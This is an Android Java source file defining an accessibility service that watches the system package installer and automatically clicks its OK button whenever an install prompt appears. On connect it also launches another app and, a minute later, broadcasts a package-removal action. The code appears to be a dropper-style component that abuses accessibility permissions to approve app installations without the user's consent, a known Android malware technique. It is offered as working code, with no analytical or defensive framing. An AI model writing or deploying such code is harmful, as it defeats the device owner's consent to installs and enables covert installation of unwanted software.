package com.us.eoe;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class SAccessService extends AccessibilityService {
    private static final String TAG = "SAccessService";
    private String[] packages = {"com.android.packageinstaller"};
    AccessibilityNodeInfo nodeInfo;

    public SAccessService() {

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        nodeInfo = getRootInActiveWindow();
        if(nodeInfo == null)
            return;
        switch (accessibilityEvent.getEventType()){
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                System.out.println("WINDOW_STATE_CHANGED");
                if(nodeInfo == null)
                    System.out.println("nodeInfo == null");
                List<AccessibilityNodeInfo> okList = nodeInfo.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button");
                if(okList.size()<1)
                    return;
                AccessibilityNodeInfo okInfo = okList.get(0);
                if(okInfo.isClickable())
                    okInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                System.out.println("WINDOW_CONTENT_CHANGED");
                if(nodeInfo == null)
                    System.out.println("nodeInfo == null");
                List<AccessibilityNodeInfo> ok2List = nodeInfo.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button");
                if(ok2List.size()<1)
                    return;
                AccessibilityNodeInfo ok2Info = ok2List.get(0);
                if(ok2Info.isClickable())
                    ok2Info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "config success!");
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        //指定包名
        accessibilityServiceInfo.packageNames = packages;
        //指定事件类型
        accessibilityServiceInfo.eventTypes = AccessibilityEvent.TYPES_ALL_MASK | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        if (Build.VERSION.SDK_INT >= 16)//Just in case this helps
            accessibilityServiceInfo.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        setServiceInfo(accessibilityServiceInfo);

        Intent intent = SAccessService.this.getPackageManager().getLaunchIntentForPackage("com.og.filemanager");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        SAccessService.this.startActivity(intent);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {


                SAccessService.this.sendBroadcast(new Intent(IBReceiver.PACKAGE_REMOVE_ACTION));
            }
        },60*1000);
    }


    private void getImageViewByReflect(){

    }
}
